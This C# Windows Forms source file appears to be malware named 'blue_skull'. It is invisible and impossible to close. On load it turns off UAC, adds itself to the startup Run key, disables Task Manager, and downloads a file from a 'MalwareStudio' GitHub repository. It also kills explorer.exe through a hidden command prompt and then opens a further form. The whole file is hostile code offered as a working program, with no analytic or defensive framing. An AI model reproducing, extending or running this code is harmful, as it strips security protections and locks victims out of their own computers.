using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32; //please add
using System.Net; //please add
using System.IO; //please add
using System.Diagnostics;

namespace blue_skull
{
    public partial class invisible : Form
    {
        public invisible()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor; //invisibility command
        }

        private void invisible_Load(object sender, EventArgs e)
        {

            this.Left = 0; //sets the company not to appear on the screen
            this.Top = 0; //sets the company not to appear on the screen
            this.Width = Screen.PrimaryScreen.Bounds.Width; //sets the company not to appear on the screen
            this.Height = Screen.PrimaryScreen.Bounds.Height; //sets the company not to appear on the screen

            //registry key set by the administrator
            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
            //registry key set by the administrator
            RegistryKey rg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rg.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            //launches the application at windows startup
            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("blue_skull", Application.ExecutablePath.ToString());
            //disables the task manager
            RegistryKey fk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            fk.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            //a condition that checks if the song is downloaded
            ServicePointManager.Expect100Continue = true; //Make protocol for donwload file from github
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string keyName = @"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows";
            string valueName = "blue_skull_confirm";
            if (Registry.GetValue(keyName, valueName, null) == null)
            {
                
                RegistryKey key2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows");
                key2.SetValue("blue_skull_confirm", 1, RegistryValueKind.String);
                WebClient webClient = new WebClient();
                webClient.DownloadFile("https://github.com/MalwareStudio/norm9/raw/master/norm9.wav", @"C:\norm9.wav");


            }
            //this form turns off and moves on to the next one
            ProcessStartInfo kokot = new ProcessStartInfo();
            kokot.FileName = "cmd.exe";
            kokot.WindowStyle = ProcessWindowStyle.Hidden;
            kokot.Arguments = @"/k taskkill /f /im explorer.exe";
            Process.Start(kokot);
            this.Hide();
            var NewForm2 = new blue_skull2();
            NewForm2.ShowDialog();
            this.Close();
            
        }

        private void invisible_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; //command against ALT + F4(anti close)

        }
    }
}
